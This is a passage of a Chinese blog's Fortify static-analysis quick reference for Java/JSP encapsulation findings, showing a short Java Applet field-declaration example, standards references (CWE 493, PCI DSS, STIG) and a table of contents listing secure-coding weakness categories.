<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">private URL url;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">public final URL url = URL_CONST;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-48"><a href="#REFERENCES-48" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. McGraw Securing Java. Chapter 7: Java Security Guidelines</p>
<p>[2] MUTABLE-8: Define wrapper methods around modifiable internal state Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 493</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[11] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>

      



      

  <div class="declare">
  <br><br>
  <strong>本文链接：</strong>
  http://dayun.shystartree.online/2020/01/01/fortify扫描结果速查(Java:JSP)-封装/
  <br>
  <strong>版权声明：</strong>本博客所有文章除特别声明外，均采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a><a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="/img/licensee.png"/></a>许可协议。欢迎转载，但转载请注明来自qingyu’s blog，并保持转载后文章内容的完整，本人保留所有版权相关权利。
  
  
  </div>





      
        <div class="page-reward">
          <a href="javascript:;" class="page-reward-btn tooltip-top">
            <div class="tooltip tooltip-east">
            <span class="tooltip-item">
              赏
            </span>
            <span class="tooltip-content">
              <span class="tooltip-text">
                <span class="tooltip-inner">
                  <p class="reward-p"><i class="icon icon-quo-left"></i>觉得写得好可以请我吃杯奶茶支持下哦～～～<i class="icon icon-quo-right"></i></p>
                  <div class="reward-box">
                    
                    <div class="reward-box-item">
                      <img class="reward-img" src="/img/alipay.jpg">
                      <span class="reward-type">支付宝</span>
                    </div>
                    
                    
                    <div class="reward-box-item">
                      <img class="reward-img" src="/img/wxpay.jpg">
                      <span class="reward-type">微信</span>
                    </div>
                    
                  </div>
                </span>
              </span>
            </span>
          </div>
          </a>
        </div>
      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
        		</li>
      		 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">fortify速查</a>
        		</li>
      		
		</ul>
	</div>

      

      

      
        
<div class="share-btn share-icons tooltip-left">
  <div class="tooltip tooltip-east">
    <span class="tooltip-item">
      <a href="javascript:;" class="share-sns share-outer">
        <i class="icon icon-share"></i>
      </a>
    </span>
    <span class="tooltip-content">
      <div class="share-wrap">
        <div class="share-icons">
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="icon icon-weibo"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="icon icon-weixin"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="icon icon-qq"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="icon icon-douban"></i>
          </a>
          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a>
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="icon icon-facebook"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="icon icon-twitter"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="icon icon-google"></i>
          </a>
        </div>
      </div>
    </span>
  </div>
</div>

<div class="page-modal wx-share js-wx-box">
    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//pan.baidu.com/share/qrcode?url=http://dayun.shystartree.online/2020/01/01/fortify扫描结果速查(Java:JSP)-封装/" alt="微信分享二维码">
    </div>
</div>

<div class="mask js-mask"></div>
      
      <div class="clearfix"></div>
    </div>
  </div>
</article>

  
<nav id="article-nav">
  
    <a href="/2020/01/01/fortify扫描结果速查(Java:JSP)-总/" id="article-nav-newer" class="article-nav-link-wrap">
      <i class="icon-circle-left"></i>
      <div class="article-nav-title">
        
          fortify扫描结果速查(Java/JSP)-API误用
        
      </div>
    </a>
  
  
    <a href="/2019/06/18/企业威胁情报平台建设之暗网监控/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">企业威胁情报平台建设之暗网监控</div>
      <i class="icon-circle-right"></i>
    </a>
  
</nav>


<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
        <div class="toc-container tooltip-left">
            <i class="icon-font icon-category"></i>
            <div class="tooltip tooltip-east">
                <span class="tooltip-item">
                </span>
                <span class="tooltip-content">
                    <div class="toc-article">
                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-JSP"><span class="toc-number">1.</span> <span class="toc-text">Java/JSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#封装"><span class="toc-number">1.1.</span> <span class="toc-text">封装</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ADF-Bad-Practices-Default-url-invoke-disallowed-Setting"><span class="toc-number">1.1.1.</span> <span class="toc-text">ADF Bad Practices: Default url-invoke-disallowed Setting</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Encryption-Secret-Held-in-Static-Field"><span class="toc-number">1.1.2.</span> <span class="toc-text">Android Bad Practices: Encryption Secret Held in Static Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-1"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-1"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-1"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-1"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Leftover-Debug-Code"><span class="toc-number">1.1.3.</span> <span class="toc-text">Android Bad Practices: Leftover Debug Code</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-2"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-2"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-2"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-2"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Request-Forgery"><span class="toc-number">1.1.4.</span> <span class="toc-text">Cross-Site Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-3"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-3"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-3"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-3"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-WebSocket-Hijacking"><span class="toc-number">1.1.5.</span> <span class="toc-text">Cross-Site WebSocket Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-4"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-4"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-4"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-4"><span class="toc-number">1.1.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Based-Cross-Zone-Scripting"><span class="toc-number">1.1.6.</span> <span class="toc-text">File Based Cross-Zone Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-5"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-5"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-5"><span class="toc-number">1.1.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-5"><span class="toc-number">1.1.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Missing-Content-Security-Policy"><span class="toc-number">1.1.7.</span> <span class="toc-text">HTML5: Missing Content Security Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-6"><span class="toc-number">1.1.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-6"><span class="toc-number">1.1.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-6"><span class="toc-number">1.1.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-6"><span class="toc-number">1.1.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Missing-Framing-Protection"><span class="toc-number">1.1.8.</span> <span class="toc-text">HTML5: Missing Framing Protection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-7"><span class="toc-number">1.1.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-7"><span class="toc-number">1.1.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-7"><span class="toc-number">1.1.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-7"><span class="toc-number">1.1.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Content-Security-Policy"><span class="toc-number">1.1.9.</span> <span class="toc-text">HTML5: Overly Permissive Content Security Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-8"><span class="toc-number">1.1.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-8"><span class="toc-number">1.1.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-8"><span class="toc-number">1.1.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-8"><span class="toc-number">1.1.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Message-Posting-Policy"><span class="toc-number">1.1.10.</span> <span class="toc-text">HTML5: Overly Permissive Message Posting Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-9"><span class="toc-number">1.1.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-9"><span class="toc-number">1.1.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-9"><span class="toc-number">1.1.10.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-CORS-Policy"><span class="toc-number">1.1.11.</span> <span class="toc-text">HTML5: Overly Permissive CORS Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-10"><span class="toc-number">1.1.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-10"><span class="toc-number">1.1.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-9"><span class="toc-number">1.1.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-10"><span class="toc-number">1.1.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Referrer-Policy"><span class="toc-number">1.1.12.</span> <span class="toc-text">HTML5: Overly Permissive Referrer-Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-11"><span class="toc-number">1.1.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-11"><span class="toc-number">1.1.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-10"><span class="toc-number">1.1.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-11"><span class="toc-number">1.1.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Unenforced-Content-Security-Policy"><span class="toc-number">1.1.13.</span> <span class="toc-text">HTML5: Unenforced Content Security Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-12"><span class="toc-number">1.1.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-12"><span class="toc-number">1.1.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-11"><span class="toc-number">1.1.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-12"><span class="toc-number">1.1.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hidden-Field"><span class="toc-number">1.1.14.</span> <span class="toc-text">Hidden Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-13"><span class="toc-number">1.1.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-13"><span class="toc-number">1.1.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-12"><span class="toc-number">1.1.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-13"><span class="toc-number">1.1.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Android-Backup-Storage"><span class="toc-number">1.1.15.</span> <span class="toc-text">Insecure Storage: Android Backup Storage</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-14"><span class="toc-number">1.1.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-14"><span class="toc-number">1.1.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-13"><span class="toc-number">1.1.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-14"><span class="toc-number">1.1.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Android-External-Storage"><span class="toc-number">1.1.16.</span> <span class="toc-text">Insecure Storage: Android External Storage</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-15"><span class="toc-number">1.1.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-15"><span class="toc-number">1.1.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-14"><span class="toc-number">1.1.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-15"><span class="toc-number">1.1.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Android-World-Readable-or-Writeable"><span class="toc-number">1.1.17.</span> <span class="toc-text">Insecure Storage: Android World Readable or Writeable</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-16"><span class="toc-number">1.1.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-16"><span class="toc-number">1.1.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-15"><span class="toc-number">1.1.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-16"><span class="toc-number">1.1.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-HTTP-Response-Cache-Leak"><span class="toc-number">1.1.18.</span> <span class="toc-text">Insecure Storage: HTTP Response Cache Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-17"><span class="toc-number">1.1.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-17"><span class="toc-number">1.1.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-16"><span class="toc-number">1.1.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-17"><span class="toc-number">1.1.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Missing-Database-Encryption"><span class="toc-number">1.1.19.</span> <span class="toc-text">Insecure Storage: Missing Database Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-18"><span class="toc-number">1.1.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-18"><span class="toc-number">1.1.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-17"><span class="toc-number">1.1.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-18"><span class="toc-number">1.1.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Full-Anonymous-Access"><span class="toc-number">1.1.20.</span> <span class="toc-text">Insecure Storage: S3 Full Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-19"><span class="toc-number">1.1.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-19"><span class="toc-number">1.1.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-18"><span class="toc-number">1.1.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-19"><span class="toc-number">1.1.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Read-ACP-Anonymous-Access"><span class="toc-number">1.1.21.</span> <span class="toc-text">Insecure Storage: S3 Read ACP Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-20"><span class="toc-number">1.1.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-20"><span class="toc-number">1.1.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-19"><span class="toc-number">1.1.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-20"><span class="toc-number">1.1.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Read-Anonymous-Access"><span class="toc-number">1.1.22.</span> <span class="toc-text">Insecure Storage: S3 Read Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-21"><span class="toc-number">1.1.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-21"><span class="toc-number">1.1.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-20"><span class="toc-number">1.1.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-21"><span class="toc-number">1.1.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Write-ACP-Anonymous-Access"><span class="toc-number">1.1.23.</span> <span class="toc-text">Insecure Storage: S3 Write ACP Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-22"><span class="toc-number">1.1.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-22"><span class="toc-number">1.1.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-21"><span class="toc-number">1.1.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-22"><span class="toc-number">1.1.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Write-Anonymous-Access"><span class="toc-number">1.1.24.</span> <span class="toc-text">Insecure Storage: S3 Write Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-23"><span class="toc-number">1.1.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-23"><span class="toc-number">1.1.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-22"><span class="toc-number">1.1.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-23"><span class="toc-number">1.1.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Bad-Practices-Leftover-Debug-Code"><span class="toc-number">1.1.25.</span> <span class="toc-text">J2EE Bad Practices: Leftover Debug Code</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-24"><span class="toc-number">1.1.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-24"><span class="toc-number">1.1.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-23"><span class="toc-number">1.1.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-24"><span class="toc-number">1.1.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-Hijacking"><span class="toc-number">1.1.26.</span> <span class="toc-text">JavaScript Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-25"><span class="toc-number">1.1.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-25"><span class="toc-number">1.1.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-24"><span class="toc-number">1.1.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-25"><span class="toc-number">1.1.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-Hijacking-Vulnerable-Framework"><span class="toc-number">1.1.27.</span> <span class="toc-text">JavaScript Hijacking: Vulnerable Framework</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-26"><span class="toc-number">1.1.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-26"><span class="toc-number">1.1.27.2.</span> <span 